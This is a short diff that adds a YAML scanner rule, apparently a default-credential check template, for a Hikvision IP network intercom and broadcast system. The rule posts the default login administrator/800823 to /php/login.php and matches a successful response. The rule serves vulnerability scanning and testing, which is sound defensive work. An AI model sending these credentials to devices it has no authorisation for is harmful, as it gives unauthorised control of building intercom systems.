@@ -1,0 +1,17 @@
+name: HIKVISION-IP网络对讲广播系统-默认账户
+description: >
+  默认口令administrator/800823
+alwaysExecute: false
+matchCount: 1
+rules:   
+  - method: POST
+    path: /php/login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded   
+    body: >
+      jsondata%5Busername%5D=administrator&jsondata%5Bpassword%5D=800823&jsondata%5Bisencrypted%5D=0
+    expression:
+      status: 200
+      body_all:
+        - "administrator"
+        - "username"     
